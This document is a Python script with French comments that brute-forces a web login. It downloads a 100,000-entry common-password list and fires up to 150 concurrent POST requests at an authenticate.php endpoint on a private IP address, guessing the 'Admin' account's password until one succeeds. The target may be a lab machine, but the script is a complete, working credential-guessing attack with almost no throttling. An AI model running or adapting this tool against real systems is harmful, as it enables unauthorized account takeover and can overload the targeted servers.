import aiohttp
import asyncio
import json
import requests
import time

# URL cible
url = "http://192.168.122.190:81/authenticate.php"

# En-têtes HTTP
headers = {
    "Accept": "*/*",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Content-Type": "application/json",
    "Origin": "http://192.168.122.190:81",
    "Proxy-Connection": "keep-alive",
    "Referer": "http://192.168.122.190:81/login.php",
    "User-Agent": "fsociety"
}

# Nom d'utilisateur à tester
username = "Admin"

# URL de la liste de mots de passe
password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"

# Télécharger la liste de mots de passe
print("Téléchargement de la liste de mots de passe...")
response = requests.get(password_list_url)
passwords = response.text.splitlines()
passwords = [pwd.strip() for pwd in passwords if pwd.strip()]
print(f"Liste téléchargée : {len(passwords)} mots de passe à tester.")

# Variables globales
total_passwords = len(passwords)
attempts = 0
found = False
found_password = None
lock = asyncio.Lock()

# Fonction pour tester un mot de passe
async def test_password(session, password, semaphore):
    global attempts, found, found_password

    async with semaphore:  # Limiter le nombre de requêtes simultanées
        # Vérifier si un mot de passe a été trouvé
        async with lock:
            if found:
                return None
            attempts += 1
            if attempts % 500 == 0:  # Afficher tous les 500 essais pour réduire les impressions
                print(f"Essai {attempts}/{total_passwords} - Mot de passe : {password}")

        # Corps de la requête
        data = {
            "username": username,
            "password": password
        }

        # Envoyer la requête
        try:
            async with session.post(url, headers=headers, json=data, ssl=False, timeout=2) as response:
                response_json = await response.json()
                if response_json.get("success", False):
                    async with lock:
                        found = True
                        found_password = password
                    return (password, response_json)
                return None
        except (aiohttp.ClientError, json.JSONDecodeError, asyncio.TimeoutError):
            return None

# Fonction principale pour gérer les requêtes asynchrones
async def main():
    # Limiter à 150 requêtes simultanées (augmenté pour plus de vitesse)
    semaphore = asyncio.Semaphore(150)

    # Créer une session HTTP
    async with aiohttp.ClientSession() as session:
        for i in range(0, len(passwords), 150):  # Traiter par lots de 150
            async with lock:
                if found:
                    break

            batch = passwords[i:i + 150]
            tasks = [test_password(session, pwd, semaphore) for pwd in batch]
            results = await asyncio.gather(*tasks)

            for result in results:
                if result:
                    password, response_json = result
                    print(f"\nSuccès ! Mot de passe trouvé : {password}")
                    print(f"Réponse complète : {response_json}")
                    break

            # Petit délai pour éviter de surcharger le serveur
            await asyncio.sleep(0.05)  # Réduit à 50 ms

# Lancer le script
start_time = time.time()
asyncio.run(main())
end_time = time.time()

# Résultat final
if found:
    print(f"\nMot de passe trouvé : {found_password}")
else:
    print("\nAucun mot de passe trouvé dans la liste.")
print(f"Temps total : {end_time - start_time:.2f} secondess")